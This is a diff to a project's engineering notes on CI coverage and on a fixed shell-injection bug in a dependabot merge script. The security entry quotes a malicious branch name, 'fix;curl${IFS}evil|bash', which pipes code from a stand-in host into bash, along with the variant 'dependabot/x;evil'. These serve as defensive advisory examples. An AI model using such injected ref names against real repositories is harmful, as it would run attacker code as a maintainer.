@@ -276,6 +276,8 @@ The full build orchestrator (`pnpm turbo run build`) is wired in `turbo.json` to
 
 Both fold into the required `CI Result` (they're steps in `pipeline`).
 
+**Coverage is not "every public package" — don't read this as "green CI = publishable".** `lint:package`/`lint:types` are per-package scripts, so turbo only runs them where they're defined; it silently skips packages that lack them. This commit added the scripts to `logger` and `route-utils` (both ordinary tsdown builds, both already on npm — they were a genuine gap). Three published packages remain **out of scope, by build format**: `angular` (ng-packagr → FESM2022, partial-Ivy — publint/attw aren't wired for that layout) and `svelte` (svelte-package output) ship non-tsdown artifacts; `core-types` is types-only. Their tarball/type validity is covered by their own build tooling, not by this gate. If a future package adds a tsdown build, add the two scripts (there is no auto-enrolment).
+
 **Why not jscpd too:** the hard 2% duplication threshold deliberately stays in the hook; CI keeps the **informational** jscpd SARIF job (`-t 100`, exit 0) — a conscious choice from the prior audit (see "jscpd …SARIF" below), so duplication is visible as PR annotations without gating merges.
 
 ### jscpd 5.x renamed the config `ignore` key to `ignorePattern` (#714)
@@ -730,13 +732,19 @@ attacker-controlled. git-refs forbid spaces and `~^:?*[` but **permit** `;`, `|`
 `eval "$MERGE_CMD"`, so a fork branch like `fix;curl${IFS}evil|bash` plus social
 engineering ("my PR conflicts, run `resolve:dependabot 123 --merge`") executed
 arbitrary shell as the maintainer. CLAUDE.md names this script as the blessed
-agent path, which raises the chance of a run against the wrong PR. Two fixes:
-(1) a `case "$BRANCH" in dependabot/*) ;; *) exit 1` guard right after the branch
-is resolved — before any fetch/checkout — both closing the injection vector and
-refusing a wrong-PR run; (2) the `--merge` path now calls `git push
+agent path, which raises the chance of a run against the wrong PR. Two fixes,
+each with a distinct job: (1) the `--merge` path now calls `git push
 --force-with-lease origin "$BRANCH"` and `gh pr merge "$PR" …` directly with
-quoted args instead of `eval`. The `PUSH_CMD`/`MERGE_CMD` variables remain only
-as printed copy-paste hints in the stop-for-review path.
+quoted args instead of `eval` — **this is what actually closes the injection
+vector** (every other `$BRANCH` use was already quoted); (2) a `case "$BRANCH" in
+dependabot/*) ;; *) exit 1` guard right after the branch is resolved — before any
+fetch/checkout — which does **not** itself block injection (the `dependabot/*`
+glob still admits `dependabot/x;evil`), but refuses a wrong-PR run and adds
+defense-in-depth. The `PUSH_CMD`/`MERGE_CMD` variables remain only as printed
+copy-paste hints in the stop-for-review path, with `$BRANCH` quoted inside the
+hint string too (a `dependabot/x;evil` branch can't reach that print — `git fetch
+origin "$BRANCH"` fails first under `set -e` unless the maintainer created such a
+ref — but the quoting removes the last theoretical paste vector).
 
 ### Danger JS
 
